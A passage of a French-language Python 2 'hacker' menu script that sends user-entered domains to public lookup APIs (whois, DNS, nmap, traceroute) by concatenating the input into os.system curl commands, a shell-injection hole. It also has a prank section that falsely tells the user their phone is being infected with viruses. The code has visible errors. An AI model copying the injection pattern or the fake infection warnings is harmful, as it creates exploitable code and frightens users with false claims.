	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m06.\033[1;91m][38;5;116m Response Http    \033[1;97m         ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m07.\033[1;91m]\033[1;92m Lien de la page\033[1;97m           ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m08.\033[1;91m]\033[1;96m Nmap\033[1;97m                      ‚ïë")
        print("\033[1;97m‚ïë \033[1;91m[\033[1;96m09.\033[1;91m]\033[1;94m Ping\033[1;97m                      ‚ïë")
        print("\033[1;97m‚ïë \033[1;91m[\033[1;96m10.\033[1;91m]\033[1;95m Trace route\033[1;97m               ‚ïë")  
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96mMG.\033[1;91m]\033[1;91m Retour au menu general\033[1;97m    ‚ïë")
	print("\033[1;97m‚ïö"+32*"‚ïê"+1*"‚ïê‚ïù")   
	print("\033[1;97m‚ïë")
	choisir_ipt()	
def choisir_ipt():	
	choisir=raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂[38;5;245m Mr [38;5;221mFaxel \033[1;31m ‚ñ∂‚ñ∂‚ñ∂ \033[1;33m")
        if choisir =="":	
	        print("\033[1;91m[!]\033[1;94m Beeeeeeeeeeeuuuuuuuuffffff ")
	        menu_ipt()		
        elif choisir =="1" or choisir =="01":
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
		print("")
		moi = raw_input("\033[1m\033[32m IP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Faxel      ' | lolcat")
		print("")
	        os.system("curl http://api.hackertarget.com/whois/?q=" + moi)	
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()	
	elif choisir =="2" or choisir =="02":	
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
		moi = raw_input("\n\033[1m\033[32m IP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Rechercher DNS       ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/dnslookup/?q=" + moi)
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()	
	elif choisir =="3" or choisir =="03":	
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Dns inverser      ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/reversedns/?q=" + moi)
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()	
	elif choisir =="4" or choisir =="04":
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Ip Local       ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/geoip/?q=" + moi)
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ")  
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()	
	elif choisir =="5" or choisir =="05":
		cls()
		print("\033[1m\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
	        os.system("toilet -f pagga 'IP inverser       ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/reverseiplookup/?q=" + moi)
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()			
	elif choisir =="6" or choisir =="06":		
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Ent√™te http       ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/httpheaders/?q=" + moi)		
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()			
	elif choisir =="7" or choisir =="07":		
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Lien Page        ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/pagelinks/?q=" + moi)		
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ")  
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()		
	elif choisir =="8" or choisir =="08":	
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
		os.system("toilet -f pagga 'Nmap       ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/nmap/?q=" + moi)
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()	
	elif choisir =="9" or choisir =="09":		
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
	        os.system("toilet -f pagga 'Attaque ping     ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/nping/?q=" + moi)	
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()			
	elif choisir =="10" or choisir =="100":		
		cls()
		print("\033[37mEntrez votre IP ou votre domaine...")
	        moi = raw_input("\n\033[1m\033[32mIP ou domaine ‚ñ∂‚ñ∂‚ñ∂ \033[33m")
		print("")
	        os.system("toilet -f pagga 'Traceroute       ' | lolcat")
	        time.sleep(1)
	        print("")
	        os.system("curl https://api.hackertarget.com/mtr/?q=" + moi)
		print("                       \033[48;5;0;38;5;197mMr Faxel                  ") 
		raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
                menu_ipt()		
	elif choisir =="mg" or choisir =="MG":	
                menu()		
	else:		
		print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + choisir + ' \x1b[1;91mindisponible')
		print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
		menu_ipt()
####################################################################################################
####################################################################################################
def menu_auteur():
	phase()
####################################################################################################	
def phase(): 
    cls()
    print(Auteur)
    horaire()
    mael("\033[1;91m[?] \033[1;97mPourquoi voulez voir les informations sur\033[1;91m Mr \033[1;96mFaxel \033[1;97m?")
    mael("\033[1;91m[?] \033[1;97mLes informations sur\033[1;91m Mr \033[1;96mFaxel\033[1;97m sont a mi confident, donc il faudrait le contacter.")
    mael("\033[1;91m[?] \033[1;97mSinon vous commettez une infraction dangereuse si vous ne le contactez en premier!")			
    mael("\033[1;91m[?] \033[1;92m****\033[1;91m Mr \033[1;96mHacker_K\033[1;97m?\033[1;92m ****")
    h = raw_input("\n\033[1;91m[?] \033[1;97mVous avez deux choix\033[1;91m :\033[1;92m o ou \033[1;91mn \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;97m ")
    if h =="n" or h =="N":
    	charge()
    	Menu_autres_scripts()
    elif h =="o" or h =="O":
    	mael("\n\033[1;91m[?] \033[1;92m*****\033[1;97m A ce stade vous avez depasser les bornes \033[1;92m*****")
    	load("\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	mael("\033[1;97m[?] Un message est en cours d'envoi a l'auteur, Patientez")
    	charge()
    	mael("\n\033[1;97m[?] Message bien transmit a l'auteur. Vous serrez empaquetter de virus dans  quelques instants!")
    	mael("\033[1;91m[?] \033[1;91mPlusieurs virus vous sera infecter a\033[1;92m 65%\033[1;91m apres avoir lu les informations sur\033[1;91m Mr \033[1;96mFaxel!")
    	e = raw_input("\n\033[1;91m[?] \033[1;97mDerni√®re chance pour ne pas etre infecter a\033[1;92m 85% \033[1;97m!Je vous conseil le\033[1;91m n \033[1;94m[\033[1;92mo/\033[1;91mn \033[1;94m]\033[1;91m : \033[1;97m ")
    	if e =="n" or e =="N":
    	     laod("\n\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	     Menu_autres_scripts()
    	elif e =="o" or e=="O":
    	     load("\n\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	     periode()
    	     mael("\n\033[1;97mInfection terminer, Votre systeme android sera bousiller dans\033[1;91m 1\033[1;97m heures\033[1;91m 30\033[1;92m mn")
    	     charge()
    	     periode()
    	     mael("\n\033[1;97mvotre systeme est bloquer")
    	     r = raw_input("\n\033[1;91m[?] \033[1;97mTaper \033[1;91mn \033[1;97mpour ne etre infecter a\033[1;92m 100% \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;97m ")
    	     if r =="n" or r =="N":
    	     	 Menu_autres_scripts()
    	     elif r =="o" or r =="O":
    	     	 load("\n\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	     	 print("")
    	     	 cls()
    	     	 charge()
		 cls()
    	     	 print(Auteur)
    	     	 load("\n\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	     	 periode()
    	     	 load("\n\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	     	 load("\n\033[1;91m[?] Alerte Alerte Alerte Alerte Alerte Alerte")
    	     	 periode()
    	     	 mael(Auteur_info)
    	     	 mael("\033[1;97mSache que ton telephone et/ou ton ordi est \033[1;93minfecter\033[1;97m, a 85%.\033[1;96m Faxel")
    	     	 raw_input('\n\033[1;91m[ \033[1;97mRetour\033[1;91m]')
                 Menu_autres_scripts()
    	     else:
    	     	 raw_input('\n\033[1;91m[ \033[1;97mRetour\033[1;91m]')
                 Menu_autres_scripts()
####################################################################################################
####################################################################################################
def menu_robot_force_pas():
	cls()
	load()
	cls()
	horaire()
	mael(logo_robot_force_pas)
	horaire()
	raw_input('\n\033[1;91m[ \033[1;97mRetour\033[1;91m]')
        Menu_autres_scripts()
####################################################################################################
####################################################################################################
####################################################################################################
if __name__ == "__main__":
       verification_robot()	
####################################################################################################
